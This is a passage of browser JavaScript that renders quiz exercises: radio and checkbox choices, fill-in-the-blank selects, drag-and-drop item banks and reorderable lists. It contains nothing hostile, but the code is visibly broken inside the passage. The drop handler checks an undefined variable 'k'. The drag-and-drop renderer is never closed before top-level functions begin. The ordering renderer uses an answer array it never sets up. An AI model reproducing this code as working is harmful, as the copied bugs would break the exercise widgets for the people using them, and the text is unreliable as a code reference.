    r.addEventListener('change', function () { st.ans = ci; st.touched = true; });
    lab.appendChild(r);
    lab.appendChild(el('span', null, ex.choices[ci]));
    box.appendChild(lab);
  });
};

RENDER.multi = function (ex, st, box, v) {
  if (!st.ans) st.ans = ex.choices.map(function () { return false; });
  v.ord.forEach(function (ci) {
    var lab = el('label', 'opt');
    var r = el('input'); r.type = 'checkbox'; r.checked = st.ans[ci];
    r.dataset.ci = ci;
    r.addEventListener('change', function () { st.ans[ci] = r.checked; st.touched = true; });
    lab.appendChild(r);
    lab.appendChild(el('span', null, ex.choices[ci]));
    box.appendChild(lab);
  });
};

RENDER.fill = function (ex, st, box, v) {
  if (!st.ans) { st.ans = {}; Object.keys(ex.blanks).forEach(function (b) { st.ans[b] = null; }); }
  var p = el('div', 'fillp');
  var parts = ex.text.split(/(\{\{b\d+\}\})/);
  parts.forEach(function (pt) {
    var m = pt.match(/^\{\{(b\d+)\}\}$/);
    if (m) {
      var sel = el('select'); sel.setAttribute('aria-label', 'gap ' + m[1]);
      var o0 = el('option'); o0.value = ''; o0.textContent = '\u2014 choose \u2014'; sel.appendChild(o0);
      v.ord.forEach(function (bi) {
        var o = el('option'); o.value = ex.bank[bi]; o.textContent = ex.bank[bi]; sel.appendChild(o);
      });
      sel.value = st.ans[m[1]] || '';
      sel.addEventListener('change', function () { st.ans[m[1]] = sel.value || null; st.touched = true; });
      sel.dataset.blank = m[1];
      p.appendChild(sel);
    } else if (pt) { p.appendChild(document.createTextNode(pt)); }
  });
  box.appendChild(p);
};

RENDER.dragdrop = function (ex, st, box, v) {
  if (!st.ans) { st.ans = {}; ex.slots.forEach(function (s) { st.ans[s.k] = null; }); }
  var pool = el('div', 'pool'); pool.id = 'pool' + curI();
  box.appendChild(el('div', 'dimtxt', 'Item bank:'));
  box.appendChild(pool);
  var slots = el('div', 'slots');
  ex.slots.forEach(function (s) {
    var sd = el('div', 'slot'); sd.dataset.slotk = s.k;
    sd.appendChild(el('div', 'slabel', s.t));
    sd.addEventListener('click', function () { placeItem(ex, st, s.k); });
    sd.addEventListener('dragover', function (e) { e.preventDefault(); sd.classList.add('over'); });
    sd.addEventListener('dragleave', function () { sd.classList.remove('over'); });
    sd.addEventListener('drop', function (e) {
      e.preventDefault(); sd.classList.remove('over');

      if (k) { selItem = k; placeItem(ex, st, s.k); }
    });

  });

  drawDD(ex, st, pool, slots);
  box._redraw = function () { drawDD(ex, st, pool, slots); };

var selItem = null;
function drawDD(ex, st, pool, slots) {
  pool.textContent = '';
  var placed = Object.keys(st.ans).map(function (k) { return st.ans[k]; });
  v_iord(ex).forEach(function (ii) {
    var it = ex.items[ii];
    if (placed.indexOf(it.t) >= 0) return;
    var b = el('button', 'item'); b.textContent = it.t; b.draggable = true;
    if (selItem === it.t) b.classList.add('sel');
    b.addEventListener('click', function () { selItem = (selItem === it.t ? null : it.t); drawAll(ex, st); });
    b.addEventListener('dragstart', function (e) { e.dataTransfer.setData('text/plain', it.t); });
    pool.appendChild(b);
  });
  if (!pool.children.length) pool.appendChild(el('span', 'ph', 'All items placed.'));
  Array.prototype.forEach.call(slots.children, function (sd) {
    var k = sd.dataset.slotk;
    Array.prototype.forEach.call(sd.querySelectorAll('.item'), function (n) { n.remove(); });
    var ph = sd.querySelector('.ph');
    if (st.ans[k]) {
      if (ph) ph.remove();
      var b = el('button', 'item'); b.textContent = st.ans[k];
      b.title = 'Click to remove back to bank';
      b.addEventListener('click', function (e) { e.stopPropagation(); st.ans[k] = null; st.touched = true; selItem = null; drawAll(ex, st); });
      sd.appendChild(b);
    } else if (!ph) { sd.appendChild(el('span', 'ph', 'Drop here')); }
  });
}
function drawAll(ex, st) {
  var h = $('exbody').querySelector('.answrap');
  if (h && h._redraw) h._redraw(); else if (h) { /* rebuild */ renderCur(); }
}
function v_iord(ex) { return S.V[curI()].iord; }
function placeItem(ex, st, slotK) {
  if (!selItem) { selItem = null; return; }
  Object.keys(st.ans).forEach(function (k) { if (st.ans[k] === selItem) st.ans[k] = null; });
  st.ans[slotK] = selItem; st.touched = true; selItem = null; drawAll(ex, st);
}

RENDER.order = function (ex, st, box, v) {

    st.ans.forEach(function (ii, pos) {
      var li = el('li'); li.draggable = true; li.dataset.pos = pos;

      var mv = el('span', 'mv');
      var up = el('button', null, '\u2191'); up.setAttribute('aria-label', 'move up');
      up.addEventListener('click', function () { if (pos > 0) { var t = st.ans[pos - 1]; st.ans[pos - 1] = st.ans[pos]; st.ans[pos] = t; st.touched = true; redraw(); } });
      var dn = el('button', null, '\u2193'); dn.setAttribute('aria-label', 'move down');
      dn.addEventListener('click', function () { if (pos < st.ans.length - 1) { var t2 = st.ans[pos + 1]; st.ans[pos + 1] = st.ans[pos]; st.ans[pos] = t2; st.touched = true; redraw(); } });
      mv.appendChild(up); mv.appendChild(dn);
